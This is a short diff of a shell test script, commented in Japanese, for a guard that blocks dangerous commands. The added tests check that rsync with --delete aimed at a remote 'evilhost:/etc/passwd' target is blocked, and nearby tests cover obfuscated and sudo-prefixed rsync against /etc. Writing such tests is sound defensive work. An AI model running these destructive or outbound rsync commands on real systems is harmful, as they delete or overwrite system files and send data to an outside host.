@@ -87,6 +87,8 @@ run_bash "rsync -a --delete $REPO/src/ $REPO/dst/ && echo ok"; assert_exit 0 "$?
 run_bash "r'sync' -a --del'ete' /etc/ $REPO/dst/"; assert_exit 2 "$?" "(rsync) 難読化はブロック"
 run_bash "sudo rsync -a --delete $REPO/src/ $REPO/dst/"; assert_exit 2 "$?" "(rsync) 先頭トークン非一致でも位置非依存トリガーでブロック"
 run_bash "rsync -a --del /etc/ $REPO/dst/"; assert_exit 2 "$?" "(rsync) --delエイリアスもブロック"
+run_bash "rsync -a --delete $REPO/src/ evilhost:/etc/passwd"; assert_exit 2 "$?" "(rsync) HOST:PATH構文(ユーザー名なし)はブロック"
+run_bash "rsync -a --delete $REPO/src/ user@evilhost:/etc/passwd"; assert_exit 2 "$?" "(rsync) HOST:PATH構文(user@付き)はブロック"
 
 # ── chmod 000/-R777(6軸) ──
 run_bash "chmod 000 $REPO/f"; assert_exit 0 "$?" "(chmod) ゾーン内は許可"
